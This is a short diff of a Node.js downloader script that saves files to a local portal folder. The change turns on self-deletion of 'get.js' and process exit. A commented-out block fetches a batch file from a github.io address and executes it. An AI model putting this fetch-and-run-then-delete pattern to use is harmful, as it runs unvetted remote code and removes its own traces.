@@ -1,6 +1,7 @@
 const fs = require('fs')
 const path = require('path')
 const request = require('request')
+const process = require('process')
 const execSync = require('./execSync.js')
 const target = 'd:\\portal\\'
 const files = [
@@ -15,8 +16,8 @@ for (let file of files) {
 }
 const timer = setTimeout(async () => {
   if (count === files.length) {
-    //await fs.rmSync('get.js', {recursive: true})
-    //process.exit()
+    await fs.rmSync('get.js', {recursive: true})
+    process.exit()
     /*request('https://8230459.github.io/git.bat').pipe(fs.createWriteStream(path.join('.', 'git.bat'))).on('close', async err => {
       if (err) return
       await execSync('git.bat')
